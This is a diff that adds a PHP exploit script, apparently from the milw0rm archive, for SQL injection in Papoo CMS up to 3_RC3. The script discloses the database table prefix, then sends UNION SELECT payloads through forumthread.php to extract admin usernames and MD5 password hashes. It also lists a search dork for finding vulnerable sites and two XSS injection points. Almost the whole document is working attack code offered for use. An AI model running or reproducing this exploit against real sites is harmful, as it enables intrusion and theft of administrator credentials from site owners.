@@ -1,0 +1,177 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "PAPOO <= 3_RC3 SQL injection / admin credentials disclosure\n";
+echo "by rgod rgod@autistici.org\n";
+echo "site: http://retrogod.altervista.org\n";
+echo "dork: \"Help * Contact * Imprint * Sitemap\" | \"powered by papoo\" | \"powered by cms papoo\"\n\n";
+
+/*
+notes:
+works regardless of magic_quotes_gpc settings...
+there is some magic quotes disable code in variable_class.php near line 120-145
+also you can always disclose table prefix...
+we have different number of columns in older version, we will shortly bruteforce query
+
+oh, we have two xss even:
+http://[target]/[path_to_papoo]/interna/hilfe.php?titel=[XSS]
+http://[target]/[path_to_papoo]/interna/hilfe.php?ausgabe=[XSS]
+
+*/
+
+if ($argc<3) {
+echo "Usage: php ".$argv[0]." host path OPTIONS\n";
+echo "host:      target server (ip/hostname)\n";
+echo "path:      path to Papoo\n";
+echo "Options:\n";
+echo "   -T[prefix]   specify a table prefix (there is nor a default one, try papoo or papoo_\n";
+echo "                however, if not specified, we will disclose it)\n";
+echo "   -p[port]:    specify a port other than 80\n";
+echo "   -P[ip:port]: specify a proxy\n";
+echo "Example:\r\n";
+echo "php ".$argv[0]." localhost /papoo/\n";
+echo "php ".$argv[0]." localhost /papoo/ -Tpapoo_\n";
+die;
+}
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+
+}
+
+function is_hash($hash)
+{
+ if (ereg("^[a-f0-9]{32}",trim($hash))) {return true;}
+ else {return false;}
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$port=80;
+$proxy="";
+for ($i=3; $i<=$argc-1; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+if ($temp=="-T")
+{
+  $prefix=str_replace("-T","",$argv[$i]);
+}
+}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+if ($prefix=="")
+{
+  $packet="GET ".$p."forumthread.php?msgid=%27 HTTP/1.0\r\n";
+  $packet.="Host: ".$host."\r\n";
+  $packet.="Connection: Close\r\n\r\n";
+  sendpacketii($packet);
+  if (strstr($html,"You have an error in your SQL syntax"))
+  {
+    $temp=explode("_papoo_message.forumid",$html);
+    $temp2=explode("AND ",$temp[0]);
+    $prefix=$temp2[count($temp2)-1];
+    echo "table prefix -> ".$prefix."\n";
+  }
+  else
+  {die("Unable to disclose table prefix...\n");}
+}
+
+$diff=array(
+            ",0,0,0,0,0",
+            ",0,0,0,0",
+            ",0,0,0",
+            ",0,0",
+            ",0",
+            ""
+           );
+for ($j=0; $j<=count($diff)-1; $j++)
+{
+$sql="9999')/**/UNION/**/SELECT/**/1,0,0,0,CONCAT('*WhOp*',username,':',password,'*WhOp*'),0,0,0,0,0".$diff[$j]."/**/FROM ".$prefix."_papoo_user/**/WHERE/**/gruppenid='g1,'/*";
+$sql=urlencode($sql);
+$packet="GET ".$p."forumthread.php?msgid=".$sql." HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+$temp=explode("*WhOp*",$html);
+for ($i=1; $i<=count($temp)-1; $i++)
+{
+ $temp2=explode(":",$temp[$i]);
+ if (is_hash($temp2[1]))
+ {
+  echo "--------------------------------------------------------\n";
+  echo "admin          -> ".$temp2[0]."                         \n";
+  echo "password (md5) -> ".$temp2[1]."                         \n";
+  echo "--------------------------------------------------------\n";
+  die;
+ }
+}
+}
+//if you are here...
+echo "exploit failed...";
+?>
+
+# milw0rm.com [2006-07-07]
